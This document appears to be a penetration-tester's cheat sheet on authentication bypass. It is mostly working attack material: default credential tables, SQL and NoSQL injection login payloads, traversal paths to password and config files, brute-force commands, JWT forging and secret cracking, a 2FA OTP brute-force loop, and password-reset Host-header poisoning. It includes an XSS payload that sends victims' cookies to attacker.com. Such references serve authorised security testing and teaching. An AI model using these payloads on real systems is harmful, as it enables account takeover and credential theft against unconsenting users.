# Authentication Bypass Complete

## Overview

Authentication bypass refers to techniques that allow an attacker to access protected resources or functionality without valid credentials. These vulnerabilities exist in authentication logic, session management, token handling, and downstream service integration.

---

## Default Credentials

Many systems ship with default credentials that are never changed.

### Common Default Credentials by Service

| Service/Device | Username | Password |
|---------------|----------|----------|
| Tomcat | admin | admin |
| Tomcat | tomcat | tomcat |
| Tomcat | role1 | role1 |
| Jenkins | admin | admin |
| Jenkins | admin | password |
| JBoss | admin | admin |
| GlassFish | admin | adminadmin |
| WebLogic | weblogic | weblogic |
| WebLogic | system | password |
| MySQL | root | (blank) |
| PostgreSQL | postgres | postgres |
| MSSQL | sa | (blank or password) |
| Oracle | system | manager |
| Oracle | sys | change_on_install |
| VNC | (varies) | (varies, often "password" or "vnc") |
| SNMP | public/private | (community strings) |
| Router (Cisco) | admin | admin |
| Router (Cisco) | cisco | cisco |
| Router (Linksys) | admin | admin |
| Router (Netgear) | admin | password |
| FTP | anonymous | (any email or blank) |
| SSH | root | root |
| Windows RDP | Administrator | (varies, often blank or "password") |

### Finding Default Credentials

```bash
# Google dork
"<product name>" default password
"<product name>" default credentials

# Databases to check
# https://cirt.net/passwords
# https://default-password.info/
# https://www.routerpasswords.com/
# https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

# Local search
grep -ri "default.*password" /usr/share/seclists/Passwords/Default-Credentials/
```

### Automated Discovery

```bash
# CME for SMB
crackmapexec smb <target> -u users.txt -p passwords.txt

# Hydra for web
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa for multiple protocols
medusa -h <target> -U users.txt -P passwords.txt -M <service>

# Patator
patator http_fuzz url=http://target.com/login method=POST body='user=admin&pass=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='incorrect'
```

---

## SQL Injection Authentication Bypass

SQLi in login forms can bypass authentication entirely by manipulating the SQL query structure.

### Classic Login Query

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```

### SQLi Payloads for Auth Bypass

```sql
# Universal bypass (username field)
admin' OR '1'='1' -- -
admin' OR '1'='1' #
admin' OR '1'='1'/*
admin' OR 1=1-- -
admin' OR '1'='1

# Password field bypass
' OR '1'='1
' OR 1=1-- -
" OR ""="
' OR ''='
' OR 1=1 #
') OR ('1'='1

# Comment-based (rest of query ignored)
admin'--
admin'#
admin'/*

# Union-based for data extraction
' UNION SELECT 1,'admin','password' -- -
' UNION SELECT null, null, null -- -

# NoSQL/JSON bypass (MongoDB)
username[$ne]=none&password[$ne]=none
username[$gt]&password[$gt]
```

### Detection

```bash
# Test each field individually
# Submit: ' OR '1'='1
# Expected bypass: login with first user account

# Submit: admin' --
# Expected bypass: login as admin without password

# Timing-based detection
# Submit: admin' OR SLEEP(5)-- -
# If response delayed 5s, SQLi is confirmed
```

### Bypass Variations

```sql
# URL encoding (%27 = ')
%27%20OR%20%271%27%3D%271

# Double encoding (%2527 = %27 = ')
%2527%2520OR%2520%25271%2527%253D%25271

# Unicode/case variations
aDmIn' OR '1'='1' --
ADMIN' OR '1'='1' --

# Using tabs/newlines instead of spaces
admin'%09OR%0A'1'='1
```

### Prevention by Developers

- Parameterized queries / prepared statements
- Input validation and whitelisting
- Stored procedures
- ORM with safe query building
- WAF rules for SQLi patterns

---

## NoSQL Injection Authentication Bypass

NoSQL databases (MongoDB, CouchDB, Cassandra) handle queries differently, but injection is still possible.

### MongoDB Auth Bypass

```json
// Normal login query (JS)
db.users.find({username: req.body.username, password: req.body.password})

// Bypass with $ne (not equal)
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Bypass with $gt (greater than)
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Bypass with $regex
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Targeting admin with $ne
{"username": "admin", "password": {"$ne": ""}}

// Boolean-based (if application expects Boolean)
{"username": "admin", "password": {"$exists": true}}

// In operator injection
{"username": {"$in": ["admin", "root"]}, "password": {"$in": ["", "admin"]}}
```

### HTTP Request Examples

```bash
# JSON body (Content-Type: application/json)
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$gt": ""}, "password": {"$gt": ""}}

# URL-encoded (will NOT work for $ operators)
# Must use JSON content type for operator injection

# Using $ne
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}

# Regex username bypass
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### MongoDB Injection via URL Parameters

Some frameworks convert URL parameters to MongoDB query operators:

```
GET /api/users?username[$ne]=admin&password[$ne]=none
GET /api/login?username[$regex]=.*&password[$regex]=.*
```

---

## Directory Traversal in Authentication

Authentication-adjacent endpoints can leak credentials or allow bypass.

### Common Traversal Targets

```bash
# Direct config file access
../../../etc/passwd
../../../etc/shadow
../../../etc/apache2/.htpasswd
../../../var/www/html/wp-config.php
../../../WEB-INF/web.xml
../../../app/config/database.php

# Authentication configuration
../../../etc/pam.d/
../../../etc/security/
../../../etc/sudoers

# Application authentication files
../../../config/auth.php
../../../config/credentials.ini
../../../conf/server.xml
../../../conf/tomcat-users.xml
```

### Testing for Traversal in Auth Context

```bash
# Test file include in authentication pages
curl -v "http://target.com/login?page=../../../etc/passwd"
curl -v "http://target.com/authenticate?template=../../../etc/passwd"

# Check if authenticated sessions expose files
# (after cookie manipulation, try traversal)
curl -v -b "session=valid" "http://target.com/download?file=../../../etc/passwd"
```

---

## Session Prediction and Manipulation

### Session Prediction

Weak session generation algorithms (predictable tokens, timestamps, sequential IDs).

```bash
# Capture multiple session tokens
# Look for patterns:
# - Sequential numbers: 1001, 1002, 1003
# - Timestamp-based: 1623456789, 1623456790
# - Weak hash: md5(username), base64(role_id)

# Test prediction
for i in $(seq 1000 1050); do
  curl -v -b "session=$i" http://target.com/admin 2>&1 | grep -E "HTTP/|Location"
done

# Burp: Sequencer tool
# 1. Capture token
# 2. Send to Sequencer
# 3. Start live capture (200+ tokens)
# 4. Analyze entropy
```

### Session Fixation

Force a known session ID on the victim.

```bash
# 1. Attacker gets a session token from server
# Session: SESSIONID=attacker_controlled_value

# 2. Attacker sends link to victim with that session ID
http://target.com/login?SESSIONID=attacker_controlled_value

# 3. Victim logs in — now the session token belongs to victim

# 4. Attacker uses the same session token to access victim's account
curl -b "SESSIONID=attacker_controlled_value" http://target.com/profile
```

### Session Hijacking

Steal an active session token.

```bash
# XSS cookie theft
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# Session in URL
# Check for session tokens in GET parameters or Referer header

# Session in HTTP response
# Check if Set-Cookie includes HttpOnly flag
# Check if session is logged in console/network traffic
```

### Cookie Manipulation

```bash
# Modify cookie values
curl -b "user_id=1; role=admin; admin=true" http://target.com/admin
curl -b "is_admin=1" http://target.com/admin/dashboard
curl -b "authenticated=true" http://target.com/protected

# Base64 decode/encode cookies
echo "YWRtaW4=" | base64 -d   # -> "admin"
echo -n "admin" | base64       # -> "YWRtaW4="

# Try various names
# admin, is_admin, role, user_type, access_level, isLoggedIn
# authenticated, group, privilege, logged_in, user_role
```

### Cookie Attributes Check

```
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax

# Missing Secure -> can be sent over HTTP
# Missing HttpOnly -> accessible via JavaScript (XSS)
# SameSite=None -> sent with cross-site requests (CSRF risk)
```

---

## JWT Attacks

JWTs (JSON Web Tokens) are widely used for stateless authentication. Several attack vectors exist.

### JWT Structure

```
header.payload.signature

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "admin", "iat": 1516239022, "role": "user"}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

### Attack 1: "None" Algorithm

Forcing the server to accept a JWT with no signature.

```bash
# Create modified JWT
# Header: {"alg": "none", "typ": "JWT"}
# Payload: {"sub": "admin", "role": "admin"}

# Use jwt_tool
python3 jwt_tool.py <token> -X a

# Manual base64
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | sed 's/=//g;s/+/-/g;s/\//_/g'
echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | sed 's/=//g;s/+/-/g;s/\//_/g'
# Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Also try: none, None, NONE, NoNe, nOnE, n0ne
# Also try uppercase: {"alg": "NONE"}, {"alg": "None"}
```

### Attack 2: Algorithm Confusion

Forcing the server to use a public key as an HMAC secret (RS256 -> HS256).

```bash
# If server uses RS256 (asymmetric):
# 1. Get the public key (often exposed at /jwks.json, /.well-known/jwks.json)
# 2. Modify header to use HS256
# 3. Sign with the public key as the HMAC secret

# Using jwt_tool
python3 jwt_tool.py <token> -X k -pk <public_key_file>

# Using manual Python
python3 << 'EOF'
import jwt
public_key = open("public_key.pem").read()
payload = {"sub": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
EOF
```

### Attack 3: Weak Secret Cracking

Weak HMAC secrets can be brute-forced.

```bash
# Using hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Using jwt-cracker
jwt-cracker -t <token> -d /usr/share/wordlists/rockyou.txt

# Using John the Ripper
python3 /usr/share/john/jwt2john.py <token> > jwt_hash.txt
john jwt_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Common weak secrets to try
secret, password, 123456, jwt_secret, change_me, pass, key
```

### Attack 4: JWK Header Injection

Injecting a controlled JWK into the JWT header.

```bash
# jwt_tool with custom key
python3 jwt_tool.py <token> -X i -I -pc sub -pv admin
```

### Attack 5: Kid (Key ID) Injection

Manipulating the `kid` header to cause path traversal or SQLi.

```bash
# Path traversal in kid
# Header: {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}

# SQLi in kid (if kid is used in DB lookup)
# Header: {"alg": "HS256", "typ": "JWT", "kid": "key' UNION SELECT 'secret' -- -"}
```

### JWT Attack Tools

```bash
# jwt_tool (full featured)
python3 jwt_tool.py -h

# jwt-cracker (simple)
jwt-cracker <token> /usr/share/wordlists/rockyou.txt

# john2jwt.py (John the Ripper conversion)
python3 /usr/share/john/jwt2john.py <token>

# hashcat (GPU accelerated)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```

### JWT Security Checklist

- [ ] Check algorithm is not set to `none` (and variants)
- [ ] Verify server enforces expected algorithm
- [ ] Check `kid` injection (path traversal, SQLi, command injection)
- [ ] Test weak HMAC secret
- [ ] Check for JWK/RSA key confusion
- [ ] Verify `exp` (expiration) is validated
- [ ] Check `nbf` (not before) validation
- [ ] Verify `iss` (issuer) matches expected
- [ ] Check for sensitive data in payload (base64 decoded)
- [ ] Test token replay within expiration window
- [ ] Check `jku` / `jwk` header injection

---

## OAuth Misconfiguration

OAuth 2.0 flows can be misconfigured in ways that allow authentication bypass.

### Common OAuth Issues

**1. CSRF on Authorization Flow**

```bash
# No state parameter = CSRF vulnerability
# Attacker crafts link that binds victim's account to attacker's OAuth provider account
https://target.com/oauth/callback?code=attacker_code
```

**2. Redirect URI Manipulation**

```bash
# Open redirect in redirect_uri
https://target.com/oauth/callback?redirect_uri=https://attacker.com/steal

# Partial URL matching bypass
https://target.com/oauth/callback?redirect_uri=https://target.com.attacker.com/

# Path traversal in redirect_uri
https://target.com/oauth/callback?redirect_uri=https://target.com/../attacker.com/
```

**3. Token Impersonation**

```bash
# If access token is shared across tenants:
# Use token from one app to access another

# If token validation is missing audience check:
# Token for service A works against service B
```

**4. Implicit Grant (response_type=token)**

```bash
# Access token in URL fragment (historical, still found)
# Captured via Referer header
# Mitigation: use Authorization Code + PKCE
```

### Testing OAuth

```bash
# Check for state parameter
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://target.com/callback"

# Test redirect URI validation
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://evil.com"

# Check token endpoint
curl -X POST https://target.com/oauth/token -d "grant_type=authorization_code&code=abc&redirect_uri=https://evil.com&client_id=app"
```

---

## 2FA Bypass Techniques

### Common Bypass Methods

```bash
# 1. Brute force OTP (if no rate limiting)
# Many apps use 6-digit codes (10^6 = 1M combos)
# If no rate limit, 6-digit OTP is brute-forceable
for pin in $(seq -w 000000 999999); do
  code=$(curl -s -b "session=abc" -d "code=$pin" http://target.com/2fa/verify | grep -c "success")
  if [ "$code" -eq 1 ]; then echo "Found: $pin"; break; fi
done

# 2. OTP reuse
# Some apps generate OTP once and don't invalidate after use
curl -b "session=abc" -d "code=123456" http://target.com/2fa/verify
curl -b "session=abc" -d "code=123456" http://target.com/2fa/verify  # still works

# 3. Bypass 2FA endpoint
# Try accessing /dashboard directly after 1FA
curl -b "session=abc" http://target.com/dashboard

# 4. OTP in response
# Check HTTP response body for leaked OTP
# Check if OTP is embedded in page source
# Check if OTP is returned in JSON response
```

### Technical Bypass Methods

**1. Direct Page Access (forced browsing)**
```bash
# After step 1 auth, try accessing protected resources directly
curl -b "session=abc" http://target.com/admin
curl -b "session=abc" http://target.com/profile
curl -b "session=abc" http://target.com/api/userinfo
```

**2. Response Manipulation**
```bash
# If 2FA success is determined by client-side JS
# Modify response from "2fa_required": true to false
# Proxy through Burp and modify JSON response
```

**3. Referer/Header Manipulation**
```bash
# Some apps skip 2FA based on certain headers
curl -b "session=abc" -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
curl -b "session=abc" -H "X-Forwarded-Host: internal" http://target.com/admin
curl -b "session=abc" -H "X-Internal-Request: true" http://target.com/admin
```

**4. Re-authentication bypass**
```bash
# Some apps prompt for password but not 2FA on "sensitive actions"
# Or prompt for 2FA but not password
# Test which checks are actually enforced
```

### Known Implementation Flaws

- **OOB (Out-of-Band) 2FA:** OTP sent via email — if email inbox is compromised
- **TOTP shared secret:** QR code / base32 secret exposed on page
- **Backup codes:** Backup codes stored in plaintext, not invalidated after use
- **SMS interception:** SS7 vulnerabilities (DEF CON level, but relevant)
- **Biometric fallback:** Fingerprint may fall back to PIN which may be bypassed

---

## Password Reset Flow Abuse

### Common Reset Flow Vulnerabilities

**1. Token Prediction**

```bash
# Predictable reset tokens
# - Simple hash: md5(email + timestamp)
# - Sequential: 100, 101, 102
# - Time-based: 1234567890 (timestamp)

# Testing
# Request reset for your own account
# Capture the token
# Decode/inspect for patterns
# Try to predict other users' tokens
```

**2. Token Leakage**

```bash
# Token in Referer header
# If reset page includes external resources
# Token in URL → Referer header to third-party site

# Token in response body
# Some apps return the token in JSON/HTML response
# Check: View Source, Network tab, API responses
```

**3. Host Header Poisoning for Reset Link**

```bash
# If reset link is generated using Host header
# Modify Host header to attacker-controlled domain
curl -H "Host: attacker.com" http://target.com/password-reset -d "email=admin@target.com"
# Victim receives: https://attacker.com/reset?token=abc123
```

**4. Email Parameter Injection**

```bash
# Change email parameter to another user's email
POST /password-reset HTTP/1.1
email=admin@target.com
# If you can intercept the reset link, change the email mid-request
```

**5. User Enumeration via Reset**

```bash
# Check differences in responses
# "Reset link sent" vs. "Email not found"
# Response timing differences
# Different status codes
# Different content length
```

**6. Weak Security Questions**

```bash
# Common answers are guessable
# "What is your favorite color?" → "blue"
# "What is your pet's name?" → "fluffy"
# "What city were you born in?" → "New York"
# Google/OSINT often reveals these answers
```

### Complete Password Reset Test Flow

```
1. Request password reset
2. Check for token in URL (GET) vs. in body (POST)
3. Inspect token predictability
4. Check if old token remains valid after new request
5. Test if multiple reset requests invalidate all previous
6. Try token more than once (replay)
7. Check for token expiry time
8. Try Host header injection
9. Test user enumeration
10. Check if reset endpoint allows password to be set to any value
11. Try changing email parameter mid-flow
12. Check if https downgrade is possible
```

---

## Cached / Remembered Credentials

### Browser Cached Credentials

```bash
# Browser autocomplete
# <input type="text" name="username" autocomplete="on">
# <input type="password" name="password" autocomplete="on">

# Check for autocomplete="off" bypass
# Some apps set autocomplete="off" but the browser ignores it
# Always test: type creds, submit, go back, see if fields are filled

# Browser password manager
# Passwords stored in browser can be extracted:
# Chrome: chrome://settings/passwords
# Firefox: about:logins
# Or via local file access:
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data (encrypted)
```

### Server-Side Cached Credentials

```bash
# Basic auth cache
# Browser caches Basic auth credentials per realm
# No way for server to invalidate
# Check for:
#   WWW-Authenticate: Basic realm="Protected Area"
# Clear browser cache to test if credentials persist

# Session remember-me features
# "Remember me" tokens often stored in cookies
# May be persistent (no expiry)
# May have predictable structure
# May not be invalidated on logout
```

### Credential Stuffing from Cache

```bash
# If cached credentials are exposed (e.g., via XSS, local file read):
# Use them against other services
# Check password reuse across different subdomains/apps
```

### Testing Methodology

```
1. Check if browser autocomplete is honored (autocomplete="on")
2. Submit login → check if fields are cached when navigating back
3. Test "Remember Me" functionality
   - How is token stored? Cookie, localStorage, IndexedDB
   - Is token encrypted? (base64 decode it)
   - Token expiry: does it ever expire?
   - Can token be replayed?
4. Test logout → does token remain valid?
   - If yes, this is a session fixation/wonky token invalidation issue
5. Check for Basic auth cached credentials
```

---

## Other Authentication Bypass Techniques

### Response Manipulation

```bash
# If auth success/failure is in response headers or body
# Look for:
#   HTTP 200 = success, 401 = failure
#   JSON {"success": true} / {"error": "invalid"}

# Modify:
#   302 redirect to /dashboard -> 200 OK
#   {"authenticated": false} -> {"authenticated": true}
#   HTTP/1.0 401 Unauthorized -> HTTP/1.0 200 OK
```

### Parameter Pollution

```bash
# Duplicate parameters
POST /login
username=admin&username=guest&password=test

# Framework may take first or second
# If first: admin (our target)
# If second: guest (may bypass if guest access)

# Array parameters
POST /login
username[]=admin&password[]=test

# Null/invalid parameters
POST /login
username=admin&password=test&role=
```

### Race Condition in Auth

```bash
# Time-of-check to time-of-use (TOCTOU)
# Send many simultaneous requests for password change
# Race window where old password still works

# Burp: send 20+ parallel requests
# Race condition in transaction processing
```

### WebSocket Bypass

```bash
# If authentication is only enforced on HTTP endpoints
# Try accessing protected functionality via WebSocket
ws://target.com/socket.io/?token=any_value

# WebSocket handshake may bypass HTTP middleware
# Check if auth check exists on WS upgrade
```

---

## Tools

```bash
# Burp Suite (Intruder, Sequencer, Repeater)
# - Intruder: brute force login forms
# - Sequencer: session token analysis
# - Repeater: manual request modification

# jwt_tool
https://github.com/ticarpi/jwt_tool

# Hydra
hydra -L users.txt -P pass.txt <target> <service>

# ffuf (form fuzzing)
ffuf -u http://target.com/login -X POST -d "user=FUZZ&pass=pass" -w users.txt -fc 401

# Patator
patator http_fuzz url=http://target.com/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'
```

---

## Related Notes

- [[03 - Web Application Hacking/3.1 Information Gathering/Web Reconnaissance]] — recon before auth testing
- [[03 - Web Application Hacking/3.2 Brute Force/Password Attacks]] — password attacks and brute forcing
- [[03 - Web Application Hacking/3.9 API Testing/API Testing Complete]] — API auth testing
- [[03 - Web Application Hacking/3.10 CMS Specific/CMS Hacking Complete]] — CMS authentication attacks
- [[03 - Web Application Hacking/3.11 Common Vulnerabilities/Common Web Vulns]] — web-specific vulnerabilities
- [[02 - Vulnerability Assessment/Vulnerability Assessment Notes]] — vulnerability assessment
